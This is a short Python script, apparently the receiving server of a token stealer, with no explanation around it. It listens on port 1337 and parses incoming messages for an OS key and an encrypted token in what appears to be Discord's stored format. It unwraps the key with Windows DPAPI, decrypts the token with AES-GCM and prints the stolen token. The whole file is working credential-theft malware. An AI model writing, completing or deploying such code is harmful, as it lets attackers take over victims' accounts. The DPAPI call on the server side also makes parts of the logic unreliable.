from socket import *
from Crypto.Cipher import AES
from base64 import b64decode
from win32crypt import CryptUnprotectData
socket = socket(AF_INET, SOCK_STREAM)
socket.bind(("10.211.55.24", 1337))
socket.listen()
def decrypt(buff, master_key):
    try:
        key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
conn , addr = socket.accept()
with conn:
        print(f"Connected by {addr}")
        true = 1
        while true == 1:
            data = conn.recv(1024)
            if not data:
                break
            data = data.decode("utf-8")
            #print(data)
            parse = data.split("Os_Key: ")
            parse = parse[1].split("Encrypted token: ")
            os_key = parse[0].replace('"',"").strip()
            token = decrypt(b64decode(parse[1].split("dQw4w9WgXcQ:")[1]), b64decode(os_key)[5:])
            print("Client token found! "+token)
